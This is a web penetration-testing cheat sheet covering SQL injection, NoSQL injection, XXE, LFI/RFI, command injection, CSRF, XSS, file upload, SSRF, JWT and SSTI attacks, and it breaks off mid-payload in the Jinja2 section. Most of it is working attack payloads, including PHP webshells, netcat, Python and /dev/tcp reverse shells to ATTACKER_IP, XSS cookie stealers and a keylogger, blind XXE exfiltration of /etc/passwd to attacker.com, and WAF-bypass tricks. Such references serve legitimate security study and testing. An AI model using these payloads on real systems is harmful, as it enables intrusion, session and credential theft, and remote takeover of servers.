---
icon: globe-pointer
---

# Web Attacks

### Web Pentesting Methodology

#### Required Tools

| Tool                        | Purpose                                 |
| --------------------------- | --------------------------------------- |
| **Burp Suite**              | Intercept, modify, replay HTTP requests |
| **OWASP ZAP**               | Free alternative interception proxy     |
| **curl**                    | Command-line HTTP requests              |
| **netcat**                  | Listeners, port checks                  |
| **ffuf / gobuster / wfuzz** | Directory & parameter fuzzing           |
| **Wappalyzer**              | Identify tech stack                     |
| **Photon**                  | Website crawler & intel extractor       |

***

#### 🗺️ Methodology Checklist

**Phase 1 — Reconnaissance**

```
robots.txt         → http://target.com/robots.txt
sitemap.xml        → http://target.com/sitemap.xml
HTTP Headers       → curl -I http://target.com
Page Source        → CTRL+U (view-source:)
Wappalyzer         → detect CMS, framework, server
Directory enum     → gobuster / ffuf
Parameter fuzzing  → ffuf / wfuzz
```

**Phase 2 — Identify User Input Points**

```
Search fields
Forms (login, registration, contact)
Comment sections
Support tickets
File upload areas
URL parameters (?id=, ?file=, ?url=)
HTTP Headers (User-Agent, Referer, X-Forwarded-For)
```

> ⚠️ **Rule:** Always start with enumeration. Leave brute-force for last — it's noisy, slow, and unreliable.

***

#### Content Enumeration — Tools

```bash
# Gobuster — directory brute force
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/big.txt

# ffuf — extensions
ffuf -u http://target.com/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt

# ffuf — directories
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt

# ffuf — files with extensions
ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.txt,.html

# ffuf — filter 403
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 403

# ffuf — show only 200
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200

# ffuf — fuzz parameters
ffuf -u 'http://target.com/page.php?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# ffuf — numeric IDs as wordlist
for i in {0..255}; do echo $i; done | ffuf -u 'http://target.com/page.php?id=FUZZ' -w - -fw 33

# ffuf — brute force login form
ffuf -u http://target.com/login -X POST \
  -d 'username=admin&password=FUZZ' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -w /usr/share/wordlists/rockyou.txt -fc 200

# Photon — crawl and extract intel
python photon.py -u "http://target.com"
python photon.py -u "http://target.com" -l 3 -o mydir --keys
```

***

### SQL Injection

#### What is it?

SQL Injection allows an attacker to insert or manipulate SQL queries executed by the database backend. Can lead to authentication bypass, data leakage, file read/write, and even OS command execution.

***

#### General Injection Methodology

```
1. Find the injectable parameter (', ", error response)
2. Determine the number of columns (ORDER BY / UNION SELECT)
3. Find database name, version
4. List tables
5. Find column names
6. Dump data
7. (Bonus) Write a webshell → RCE
```

***

#### SQL Injection in Search Fields

```sql
-- Test for injection
Sql.php?search='
Sql.php?search=test' ORDER BY 1-- -
Sql.php?search=test' ORDER BY 2-- -   -- increment until error

-- Once columns known (e.g., 7 columns):
Sql.php?search=pentesting' union select 1,1,1,1,1,1,1#

-- Get database name + version
Sql.php?search=pentesting' union select 1,database(),@@version,1,1,1,1#

-- List tables
Sql.php?search=pentesting' union select 1,table_name,1,1,1,1,1 from information_schema.tables#

-- List columns of 'users' table
Sql.php?search=pentesting' union select 1,column_name,1,1,1,1,1 from information_schema.columns where table_name='users'#

-- Dump credentials
Sql.php?search=pentesting' union select 1,login,user,password,1,1,1 from users#

-- Write webshell (needs FILE privilege)
Sql.php?search=' and 1=0 union all select 1,"<?php echo shell_exec($_GET['cmd'])?>",1,1,1,1,1 into outfile "/var/www/html/shell3.php"#
```

***

#### SQL Injection in URL Parameters

```sql
-- Trigger error
http://domain.com/profile?id=1'
http://domain.com/profile?id=1''

-- Find column count
http://domain.com/profile?id=1 UNION SELECT 1,2,3

-- Get DB name (3 columns)
http://domain.com/profile?id=0 UNION SELECT 1,2,database()

-- List tables in DB 'sqlihacked'
http://domain.com/profile?id=0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables WHERE table_schema='sqlihacked'

-- List columns of table
http://domain.com/profile?id=0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns WHERE table_name='sqlihacked'

-- Dump usernames and passwords
http://domain.com/profile?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM users

-- Enumerate database names
searchitem=test' UNION SELECT 1,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),3-- -
```

***

#### Boolean-Based Blind SQLi

> No error message returned. Response changes based on true/false condition.

```sql
-- Find column count
0' UNION SELECT 1;--
0' UNION SELECT 1,2;--
0' UNION SELECT 1,2,3;--    -- no error = 3 columns

-- Find DB name char by char
0' UNION SELECT 1,2,3 where database() like 's%';--
0' UNION SELECT 1,2,3 where database() like 'sq%';--
-- keep extending until full name

-- List tables (assuming DB name = 'dbhacked')
0' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='dbhacked' and table_name like 'a%';--

-- List columns (table = 'users')
0' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='dbhacked' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

-- Dump password (user = 'admin')
0' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%'
```

***

#### Time-Based Blind SQLi

> Response is based on how long the server takes to respond.

```sql
-- Find column count (2 columns = 5 sec delay)
0' UNION SELECT SLEEP(5),2;--

-- Check if DB name starts with 's' (delays if true)
SELECT * from users where username="admin" and password like binary '9%' and sleep(10)#
```

***

#### SQL Injection in Login Forms

```sql
-- Classic login bypass payloads (username or password field)
root' or 1=1##
' or 1=1-- -;
" OR "1"="1
' or 1=1 -- #
1' or '1'='1
' or 1=1;-- -
' or ''='
' or 1--
') or true--
" or true--
")) or true--
admin")) -- -
```

> 💡 If injectable but can't login as admin → use `sqlmap` to dump the DB entries.

***

#### Second Order SQL Injection

> Payload is **stored** on one page (e.g., login) and **executed** on another page (e.g., products.php).

```sql
-- Register with these as username — they execute when visiting other pages:
b') -- -
') UNION SELECT table_name, table_schema FROM information_schema.columns #
') UNION SELECT table_name, column_name FROM information_schema.columns #
') UNION SELECT username, password from users #
```

***

#### Bypassing SQL Filters

**UNION Keyword Filter**

```sql
-- If "UNION" is filtered, try mixed case
Email=' UNion select 1,2,3,concat(command,"@test.com") -- -
Email=' UNion select 1,2,3,concat(table_name,"@test.com") FROM information_schema.tables where table_schema="databasename" limit 1,1 -- -
Email=' UNion select 1,2,3,concat(column_name,"@test.com") FROM information_schema.columns where table_name="tablename" limit 2,1 -- -
Email=' UNion select 1,2,3,concat(password,"@test.com") FROM tablename limit 1,1 -- -
```

**Space / Comment Bypass**

```
UNION%20SELECT
UNION%09SELECT
UN/**/ION/**/SELECT
UNION%0ASELECT
```

***

#### SQLMap — Automated Exploitation

```bash
# Get DB banner / software
sqlmap -u "http://example.com/product/14*" --banner

# Use captured Burp request
sqlmap -r req.txt --current-db

# List tables
sqlmap -u "http://example.com/product/14*" --tables

# Dump table
sqlmap -u "http://example.com/product/14*" -D dbname -T tablename --dump

# Dump specific columns
sqlmap -u "http://example.com/product/14*" -D dbname -T tablename -C "username,password" --dump

# Write SSH keys to remote host (file write required)
sqlmap -u "http://example.com/product/14*" \
  --file-write="/root/.ssh/id_rsa.pub" \
  --file-dest="/home/user/.ssh/authorized_keys"

# Capture Burp request → OS shell
sqlmap -r req.txt --os-shell

# OS shell → netcat shell
# In os-shell: nc -e /bin/bash ATTACKER_IP 4444

# OS shell → Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Bypass WAF
sqlmap -r req.txt --current-db --tamper=space2comment

# Second order SQLi
sqlmap --technique=U -r login.request --dbms mysql \
  --second-order 'http://domain.com/products.php' -p user

# Blind SQLi with string matching
sqlmap -r login.request --level 5 --risk 3 --batch \
  --string "Wrong credentials" --dump

# With tamper scripts
sqlmap -r req.txt --tamper=between,randomcase

# SQLmap with custom tamper (changing cookie per request)
sqlmap -r req.txt --tamper=/path/to/custom_tamper.py
```

***

### NoSQL Injection

#### Types

| Type                   | Description                                             |
| ---------------------- | ------------------------------------------------------- |
| **Syntax Injection**   | Break out of NoSQL query structure                      |
| **Operator Injection** | Inject NoSQL operators (`$ne`, `$gt`, `$regex`, `$nin`) |

***

#### &#x20;Login Bypass — Operator Injection

```
# URL-encoded POST body
user[$ne]=test&pass[$ne]=test

# Login as any user EXCEPT admin
user[$nin][]=admin&pass[$ne]=test01

# Exclude multiple users
user[$nin][]=admin&user[$nin][]=pedro&user[$nin][]=john&pass[$ne]=test01
```

**JSON POST Body**

```json
{"username": {"$ne": "xxxx"}, "password": {"$ne": "yyyy"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "wrong"}}
```

***

#### Extract Passwords via Regex

```
# Check password length
user=admin&pass[$regex]=^.{8}$

# Brute char by char (starts with 'b', 8 chars)
user=admin&pass[$regex]=^b.......$

# Continue rotating a-z,0-9 until hit valid response
user=admin&pass[$regex]=^pa......$
user=admin&pass[$regex]=^pas.....$
```

***

### IDOR (Insecure Direct Object Reference)

#### What is it?

Application exposes internal object references (IDs, filenames) that users can manipulate to access unauthorized data.

***

#### Exploitation

```
# URL parameter manipulation
https://target.com/getDocument.php?documentID=1842  →  change to 1841, 1843...

# POST body manipulation
{"order_id": "12345"}  →  try "12344", "12346"

# API endpoint
GET /api/v1/user/1001/data  →  try /api/v1/user/1000/data

# File access
https://target.com/download?file=report_1001.pdf  →  try report_1000.pdf

# IDOR in cookies / hidden fields
Change userId=5  →  userId=1  (admin)
```

> 💡 **Test everywhere:** URL params, POST body, JSON fields, cookies, path params, HTTP headers.

***

### XML Injection & XXE

#### XML Injection

```xml
<!-- Normal XML -->
<user>
  <username>Homer</username>
  <email>homer@simpson.com</email>
</user>

<!-- Injecting a second user via email field -->
homer@simpson.com</email></user>
<user>
  <username>Attacker</username>
  <email>attacker@evil.com</email>
</user>
```

***

#### XML External Entity

> **XXE** exploits XML parsers that process external entity references. Can read local files, trigger SSRF, DoS, or RCE.

| Type                    | Description                                         |
| ----------------------- | --------------------------------------------------- |
| **In-Band**             | Attacker gets immediate response with file contents |
| **Out-of-Band (Blind)** | No response — exfiltrate data to attacker's server  |

**In-Band XXE Payloads**

```xml
<!-- Read /etc/passwd -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>

<!-- Alternative syntax -->
<!DOCTYPE test [ <!ELEMENT test ANY >
<!ENTITY payload SYSTEM "file:///etc/passwd" >]>
<userInfo>
  <firstName>test</firstName>
  <lastName>&payload;</lastName>
</userInfo>

<!-- Read SSH private key -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/user/.ssh/id_rsa'>]>
<root>&read;</root>

<!-- Windows file read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE testing [
<!ELEMENT testing ANY >
<!ENTITY payload SYSTEM "file:///c:/boot.ini" >]>
<testing>&payload;</testing>

<!-- RCE via expect:// (if PHP expect module enabled) -->
<!DOCTYPE root [<!ENTITY payload SYSTEM "expect://id">]>
<root>&payload;</root>

<!-- PHP filter — read PHP files as base64 -->
<!DOCTYPE root [<!ENTITY payload SYSTEM
'php://filter/convert.base64-encode/resource=/etc/passwd'>]>
<root>&payload;</root>
```

**Blind XXE — Exfiltrate to Attacker**

```xml
<!-- Post /etc/passwd to attacker server -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE testing [
<!ELEMENT testing ANY >
<!ENTITY % payloadv1 SYSTEM "file:///etc/passwd" >
<!ENTITY payloadv2 SYSTEM "http://attacker.com/?%payloadv1;">
]>
<foo>&payloadv2;</foo>

<!-- Download attacker's shell -->
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker-ip:port/shell.php" >]>
<foo>&xxe;</foo>
```

**XXE against JSON endpoints**

```
1. Intercept the JSON request in Burp Suite
2. Change Content-Type: application/json  →  Content-Type: application/xml
3. Convert the JSON body to equivalent XML
4. Inject XXE payload

Example POST:
POST /test-page HTTP/1.1
Host: domain.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
  <search>name</search>
  <value>&xxe;</value>
</root>
```

**Tools for Blind XXE**

```bash
# xxe.sh — generate OOB payloads
https://www.xxe.sh/

# 230-OOB listener
git clone https://github.com/lc/230-OOB
python3 230.py 2121
```

***

### Directory Traversal & LFI/RFI

#### Directory Traversal

```
# Basic
https://target.com/loadImage?filename=../../../etc/passwd
http://target.com/../../../etc/shadow

# Bypass: nested traversal (if ../ is stripped)
....//....//....//etc/passwd
....\/....\/....\/etc/passwd

# Null byte (bypass extension appending — older PHP)
filename=../../../etc/passwd%00.png

# URL encoding
../../../etc/passwd  →  %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

***

#### LFI — Local File Inclusion

```bash
# Method 1: Direct path
http://domain.com/test.php?file=/etc/passwd

# Method 2: Path traversal
http://domain.com/test.php?file=../../../../etc/passwd

# Method 3: Null byte bypass (old PHP)
http://domain.com/test.php?file=../../../../etc/passwd%00

# Method 4: POST request
curl -X POST http://domain.com/test.php \
  -d 'method=POST&file=../../../../etc/passwd%00'

# Method 5: PHP wrapper filter (read PHP files without execution)
http://domain.com/page.php?file=php://filter/read=string.rot13/resource=/index.php
http://domain.com/page.php?file=php://filter/convert.base64-encode/resource=/index.php
```

**LFI → RCE: Log Poisoning**

```bash
# Step 1: Inject PHP code into Apache access log via User-Agent
curl -A "<?php phpinfo(); ?>" http://domain.com/login.php
# Or for reverse shell:
curl -A "<?php system(\$_GET['cmd']); ?>" http://domain.com/

# Step 2: Include the log file via LFI to execute the code
http://domain.com/page.php?file=../../../../var/log/apache2/access.log&cmd=id

# Log file locations:
# Apache:  /var/log/apache2/access.log
# Nginx:   /var/log/nginx/access.log
# SSH:     /var/log/auth.log
```

**LFI → RCE: PHP Sessions**

```bash
# Step 1: Set PHP code as your username on login page
# Username: <?php system($_GET['cmd']); ?>

# Step 2: Find session file location (check phpinfo)
# Common locations:
# /tmp/
# /var/lib/php5/
# /var/lib/php/session/
# C:\Windows\Temp\

# Step 3: Include session file via LFI
http://domain.com/page.php?file=../../../../var/lib/php/session/sess_PHPSESSIONID&cmd=id
```

***

#### RFI — Remote File Inclusion

```bash
# Include a remote PHP file hosted on attacker server
http://domain.com/test.php?file=http://attacker.com/shell.php

# Use data:// URI
http://domain.com/test.php?file=data://text/plain;base64,BASE64_ENCODED_PHPCODE

# Prepare your shell on attacker machine:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80
```

***

### Command Injection

#### Types

| Type        | Description                                  |
| ----------- | -------------------------------------------- |
| **Verbose** | Output is returned directly to the attacker  |
| **Blind**   | No output — use time delays or OOB callbacks |

***

#### Injection Syntax

```bash
# Chaining operators
expected_input ; payload
expected_input && payload
expected_input & payload
expected_input | payload
expected_input || payload

# Blind — store to file and read back
1&cat /etc/passwd > /tmp/out.txt
1&cat /tmp/out.txt

# Blind — time delay confirmation
1; sleep 5
1 | timeout /T 5    # Windows

# Full payload list:
# https://github.com/payloadbox/command-injection-payload-list
```

***

#### Bypassing WAF / Filters

**Dot / Slash Filter Bypass**

```bash
# If / is filtered — convert IP to hex format
# 192.168.1.5 → 0xc0a80101

# Normal (blocked)
http://domain.com/page.php?id=1%26wget+192.168.1.5/shell.php

# Bypass with hex IP
http://domain.com/page.php?id=1%26wget+0xc0a80101/shell.php
```

**Escape Characters Bypass**

```bash
# Backslash inserted mid-command
http://domain/product/?id='w\g\e\t 10.10.10.10 -O /t\m\p'
http://domain/product/?id='w\get 10.10.10.10 -O /tmp'
# Sometimes needs leading space:
http://domain/product/?id= 'w\get 10.10.10.10 -O /tmp'
```

**Empty Shell Variable Bypass**

```bash
# ${emptyvar} inserts nothing, breaks up blacklisted strings
http://domain/product/?id=wget http://attacker.com${emptyvar}/sh${emptyvar}ell.php

# Works because WAF sees 'wgethttp...sh...ell' not 'wget'
```

***

### CSRF (Cross-Site Request Forgery)

#### What is it?

Attacker tricks a logged-in user into unknowingly submitting a request to the target site. Used to change email, password, transfer funds, add admin users, etc.

***

#### Step-by-Step Exploit

```
1. Identify the target action (e.g., password change form)
2. Capture the HTTP request with Burp Suite
3. Right-click → Engagement tools → Generate CSRF PoC
4. Embed the generated form in your attacker page
5. Send attacker page link to victim
```

***

#### CSRF PoC — POST Request

```html
<html>
<body>
  <script>history.pushState('', '', '/')</script>
  <form action="https://target.com/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <input type="submit" value="Submit request" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```

#### CSRF PoC — GET Request

```html
<html>
<body>
  <script>history.pushState('', '', '/')</script>
  <form action="https://target.com/my-account/change-email" method="GET">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <input type="submit" value="Submit request" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```

***

#### CSRF Token Bypass Techniques

| Bypass                            | Method                                        |
| --------------------------------- | --------------------------------------------- |
| **No token**                      | Submit without token — test if accepted       |
| **Remove token param**            | Delete `csrf_token=xxx` from request entirely |
| **POST → GET**                    | Change method, server may not validate        |
| **Blank token**                   | Set `csrf_token=` (empty string)              |
| **Reuse another session's token** | Sometimes not bound to session                |
| **Swap same-length token**        | Randomize token but keep same length          |

***

### XSS (Cross-Site Scripting)

#### Types Overview

| Type          | Storage                         | Trigger                            |
| ------------- | ------------------------------- | ---------------------------------- |
| **Reflected** | Not stored                      | Victim clicks malicious link       |
| **Stored**    | Stored in DB                    | Renders for all visitors           |
| **DOM-based** | Client-side JS                  | JS manipulates DOM from URL/input  |
| **Blind**     | Stored, not visible to attacker | Fires when admin views admin panel |

***

#### Reflected XSS

**Entry Points:** URL params, search fields, headers, contact forms

```javascript
// Basic test payloads
<script>alert("Hello")</script>
<script>alert(window.location.hostname)</script>

// Escape input tags
"><script>alert('XSS');</script>

// Escape textareas
</textarea><script>alert('XSS');</script>

// Escape JS strings
';alert('XSS');//

// Cookie stealer (reflected)
<script>var i=new Image(); i.src="http://ATTACKER_IP:8000/?cookie="+btoa(document.cookie);</script>
<script>fetch('http://ATTACKER_IP:8000/?cookie=' + btoa(document.cookie));</script>
<script>document.location='http://ATTACKER_IP:8000/?c='+document.cookie</script>
<script>window.location='http://ATTACKER_IP/?cookie='+document.cookie</script>
```

***

#### Stored XSS

**Entry Points:** Comments, profile bio, user names, support tickets, product reviews

```javascript
// Basic test
<script>alert('XSS')</script>

// Using String.fromCharCode to avoid quote filters
<script>alert(String.fromCharCode(88,83,83))</script>

// Escape input context
"><script>alert('XSS');</script>
</textarea><script>alert('XSS');</script>

// img onerror payloads
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>

// SVG payloads
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(/XSS/)

// Div event handler payloads
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>

// Cookie stealer (stored)
<script>fetch('https://ATTACKER_IP/?cookie=' + btoa(document.cookie));</script>
<script>window.location='http://ATTACKER_IP?cookie='+document.cookie</script>

// Keylogger
<script>document.onkeypress = function(e) {
  fetch('https://ATTACKER_IP/log?key=' + btoa(e.key));
}</script>
```

***

#### DOM-Based XSS

```javascript
// DOM manipulation payloads
test" onmouseover="alert('XSS')"
test" onmouseover="alert(document.cookie)"
#"><img src=/ onerror=alert(2)>
<iframe src="javascript:alert(`xss`)">
```

***

#### Blind XSS

```html
<!-- Use XSS Hunter payload — fires when admin views page -->
"><script src=https://yoursubdomain.xss.ht></script>

<!-- Or manual callback -->
<script>new Image().src="http://ATTACKER_IP/?c="+document.cookie</script>
```

**Tools:** [https://xsshunter.com/](https://xsshunter.com/)

***

#### XSS Filter Bypass Techniques

```javascript
// Case variation
<ScRiPt>alert(1)</sCrIpT>

// Without script tags
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>

// Event handler bypass list
onerror / onsubmit / onload / onmouseover
onfocus / onmouseout / onkeypress / onchange

// Encoding bypass
<img src="x" onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;(1)">
%3Cscript%3Ealert(1)%3C%2Fscript%3E

// Polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/-!>\x3csVg/<sVg/oNloAd=alert('XSS')//>

// Bypass quotes filter — use String.fromCharCode
<img src="/><script>eval(String.fromCharCode(100,111,...))
</script>" />
```

***

### HTML Injection & Iframe Injection

#### Reflected HTML Injection

```
# Test in URL parameter
http://target.com/search.php?query=<h2>Hi</h2>
http://target.com/search.php?query=<script>alert(document.cookie)</script>
http://target.com/search.php?query=<h1><a href="http://attacker.com">Click Me</a></h1>
```

#### Stored HTML Injection

```html
<!-- Inject in comment/form fields -->
<h1>Defaced!</h1>
<a href="http://attacker.com">Win a prize</a>
```

#### Iframe Injection

```
# Inject in URL parameter that controls iframe src
http://target.com/page.php?ParamUrl=http://attacker.com&ParamWidth=1000&ParamHeight=250

# Auto-redirect iframe
<iframe src="javascript:top.location.href='http://attacker.com'"></iframe>
```

***

### File Upload Vulnerabilities

#### What it allows

* Upload and execute arbitrary files (PHP, JSP, ASP)
* Get a reverse shell on the server
* Execute system commands

***

#### Basic Webshell Upload

```php
<!-- Minimal PHP webshell -->
<?php system($_GET['cmd']); ?>

<!-- More complete -->
<?php echo shell_exec($_REQUEST['cmd']); ?>

<!-- One-liner for upload -->
<?php echo system($_GET['cmd']); ?>
```

#### ImageMagick RCE — CVE-2016-3714

```bash
# Create .mvg payload file
nano payload.mvg
# Content:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"|setsid /bin/bash -i >/dev/tcp/ATTACKER_IP/PORT 0<&1 2>&1")'
pop graphic-context

# Upload and trigger
```

***

#### Bypass File Upload Filters

**Extension Bypass**

```
# PHP extension alternatives accepted by some configs
shell.php
shell.PHP
shell.php5
shell.php7
shell.php3
shell.php4
shell.phtml
shell.pHTML
shell.shtml
shell.phar

# Double extension
shell.jpg.php
shell.php.jpg    # sometimes only last extension checked

# Null byte (old PHP versions)
shell.php%00.jpg
```

**MIME Type Bypass (Burp Suite)**

```
# Intercept upload request
# Change: Content-Type: application/x-php
# To:     Content-Type: image/jpeg
```

**Magic Bytes Bypass**

```bash
# Add GIF header to bypass magic byte check
echo 'GIF87a' > shell.php.gif
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.gif

# Or use exiftool to embed PHP in EXIF of real image
exiftool -Comment='<?php system($_GET["cmd"]); ?>' real_image.jpg
mv real_image.jpg shell.php.jpg
```

**PHP ZIP Filter Bypass (when filename changes after upload)**

```bash
# Step 1: Create webshell
echo '<?php echo system($_GET["cmd"]); ?>' > cmd.php

# Step 2: Zip it
zip shell.zip cmd.php

# Step 3: Upload the zip

# Step 4: Trigger via PHP zip filter
http://domain.com?file=zip://uploads/UPLOADED_FILENAME%23cmd&cmd=id
```

**File Name Truncation Bypass**

```bash
# Server truncates long filenames — last extension (.png) gets cut off
URL=$(python -c 'print "http://domain.com/upload" + "A"*232 + ".php.png"')
curl -i -s -k -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary "url=$URL"
```

***

### SSRF (Server-Side Request Forgery)

#### What is it?

Tricks the **server** into making HTTP requests to internal or external resources on behalf of the attacker. Can expose internal services, cloud metadata, admin panels.

***

#### Vulnerable Code Examples

```php
<?php
if (isset($_GET['url'])) {
    $url = $_GET['url'];
    $image = fopen($url, 'rb');
    header("Content-Type: image/png");
    fpassthru($image);
}
```

```python
@app.route("/")
def start():
    url = request.args.get("id")
    r = requests.head(url, timeout=2.000)
    return render_template("index.html", result=r.content)
```

***

#### &#x20;Exploitation Payloads

```bash
# Basic — access internal admin
http://target.com/stock?url=http://localhost/admin
http://target.com/stock?url=http://127.0.0.1/admin

# Access internal users endpoint
http://target.com/stock?url=https://domain.com/server/users/

# Directory traversal via SSRF
http://target.com/stock?url=/../../users

# AWS metadata (cloud instances)
http://target.com/stock?url=http://169.254.169.254/latest/meta-data/
http://target.com/stock?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Cut off extra URL params using &x=
# Legit: ?url=https://domain.com/profile?id=1&token=4
# Exploit:
http://target.com/stock?url=http://hacker.com/hack?name=ssrf&x=

# Port-based payloads
http://[::]:[PORT]
http://[IP]:[PORT]
http://:::[PORT]
http://2130706433:3306       # 127.0.0.1 in decimal
http://0x7f000001:80         # 127.0.0.1 in hex
```

***

#### SSRF Filter Bypass

| Bypass        | Payload                             |
| ------------- | ----------------------------------- |
| Decimal IP    | `http://2130706433/` (= 127.0.0.1)  |
| Hex IP        | `http://0x7f000001/`                |
| IPv6          | `http://[::1]/`                     |
| URL encoding  | `http://127%2E0%2E0%2E1/`           |
| DNS rebinding | Domain that resolves to internal IP |
| Short URL     | bit.ly pointing to 127.0.0.1        |

***

### JWT Attacks

#### JWT Structure

```
header.payload.signature

Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← header (base64)
.eyJ1c2VyIjoiYWRtaW4ifQ                 ← payload (base64)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV    ← signature (HMAC/RSA)
```

**Header:** `{"typ":"JWT","alg":"RS256"}`\
**Payload:** claims like `{"user":"admin","role":"user"}`\
**Secret:** Only known to server — verifies token wasn't tampered

***

#### Attack 1 — Algorithm: none

```
1. Decode the JWT (base64)
2. Change header: "alg": "RS256" → "alg": "none"
3. Modify payload: "role": "user" → "role": "admin"
4. Re-encode header + payload in base64
5. Delete the signature (keep trailing dot)

Result: header.payload.   ← empty signature
```

***

#### Attack 2 — RS256 → HS256 Key Confusion

```bash
# 1. Get the server's public key (often at /jwks.json or /.well-known/jwks.json)

# 2. Convert public key to hex
cat key.pub | xxd -p | tr -d "\n"

# 3. Sign the JWT using public key as HMAC secret
echo "header.payload" | openssl dgst -sha256 -mac HMAC -macopt hexkey:PUBLIC_KEY_HEX

# 4. Decode hex signature to base64
python -c "import base64,binascii; print(base64.urlsafe_b64encode(binascii.a2b_hex('HEX_FROM_STEP3')).replace('=',''))"

# 5. Combine: new_header.new_payload.new_signature

# Automated with TokenBreaker
git clone https://github.com/cyberblackhole/TokenBreaker
python3 RsaToHmac.py -t [JWT-TOKEN] -p [public-key]
```

***

#### Attack 3 — Brute Force Secret

```bash
# Install jwt-cracker
sudo npm install --global jwt-cracker

# Crack the secret
jwt-cracker [JWT_TOKEN]

# With hashcat
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
```

***

#### jwt\_tool — All-in-One

```bash
git clone https://github.com/ticarpi/jwt_tool
pip3 install termcolor cprint pycryptodomex requests

# Validate a token
python3 jwt_tool.py [JWT] -V -pk public_key.pem

# Tamper with token
python3 jwt_tool.py [JWT] -T

# Exploit: alg=none
python3 jwt_tool.py [JWT] -X a

# Exploit: key confusion (RS256→HS256)
python3 jwt_tool.py [JWT] -X k -pk public_key.pem

# Exploit: key confusion + set field value
python3 jwt_tool.py -t [URL] -rc "cookie" -X k -I -pc username -pv admin

# Exploit: inject SQL payload into JWT field
python3 jwt_tool.py -t [URL] -rc "cookie" -X k -I -pc username -pv "' OR 1=1-- -"

# Send JWT in HTTP request (scan mode)
python3 jwt_tool.py -t [URL] -rc "cookie" -rh "header" -cv "Test" -M er
```

***

### SSTI (Server-Side Template Injection)

#### What is it?

User input is **directly embedded into a template** without sanitization. The template engine processes it — allowing code execution.

***

#### Detection

```
# Fuzz entry point with:
${{<%[%'"}}%\
{{2+2}}
${2+2}
<%= 2+2 %>

# If {{7*7}} returns 49 → Jinja2 or Twig
# If {{html "Hi"}} returns Hi → Mako
# Error message usually reveals template engine

# Template engine syntax markers:
{{ }}   → print statement
{% %}   → block statement (if, for)
{# #}   → comment
{{ . }}  → current object (Go templates)
{{ .DebugCmd "id" }}  → execute command (Go)
```

***

#### Jinja2 (Python/Flask) Exploitation

```python
# Get user ID
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

# Alternative RCE
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# Encoded payload (bypass underscore filter)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# Python reverse shell via Jinja2
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x()._module.__builtins__['__import__']('os').popen(
